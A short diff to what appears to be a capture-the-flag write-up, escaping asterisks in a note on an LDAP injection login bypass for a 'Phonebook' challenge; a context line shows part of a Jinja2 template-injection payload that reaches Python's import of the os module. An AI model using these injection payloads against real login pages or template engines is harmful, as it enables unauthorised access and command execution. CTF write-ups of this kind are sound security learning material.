@@ -8,7 +8,7 @@ http://<ip_address>/{{request.application.__globals__.__builtins__.__import__('o
 ```
 
 ## Phonebook `LDAP Injection`
-Bypass login using *:* credentials.
+Bypass login using \*:\* credentials.
 
 Get reese's password -> flag:
 Python script: 
